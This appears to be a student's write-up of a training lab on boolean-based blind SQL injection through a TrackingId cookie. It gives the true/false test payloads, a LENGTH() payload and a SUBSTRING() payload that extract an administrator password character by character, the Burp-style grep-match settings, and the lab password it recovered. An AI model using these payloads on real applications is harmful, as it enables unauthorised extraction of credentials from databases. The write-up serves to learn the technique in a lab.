#  Lab: Blind SQL Injection with Conditional Responses

##  Lab Description
This lab contains a **Blind SQL Injection** vulnerability in the **product category filter**.

- The application uses a **TrackingId cookie** for analytics.
- The backend executes an SQL query using the cookie value.
- **Query results are not displayed**
- **No SQL errors are shown**
- The page shows **"Welcome back!"** 

 This behavior allows **boolean-based blind SQL injection**.


##  1. Reconnaissance

###  Vulnerability Location
- **Cookie parameter:** `TrackingId`

###  Detection Method

####  True Condition
```sql
' AND '1'='1'--
```
-> Welcome back(Standard SQL)
```sql
' AND '1'='2'--
```
-> Fail
## 2. Exploitation Steps
**STEP1:**
* **we use length() to identify the number of string**
```sql payload:
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a'--
```
We add § with '1' and payload we set range 1->30

After doing that, I find 20

**STEP2:**
* **now we use substring() to look for password**
```sql payload:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'--
```
Add § with 'a' because of different purpose

-- + space(sql comment)

range(0-9),(a-z)


**STEP3:**
* **To check difference clearly**
```sql payload:
Settings → Grep - Match → Add: Welcome back!
```
-> We get 20
* **NOTE:**
* if script return nthing:
  - check TrackingId expired
  - session cookie expired
* moreover:
  - disable URL-encode these characters
----> we find password: bjpn1or4ucu1p5kbh3a2





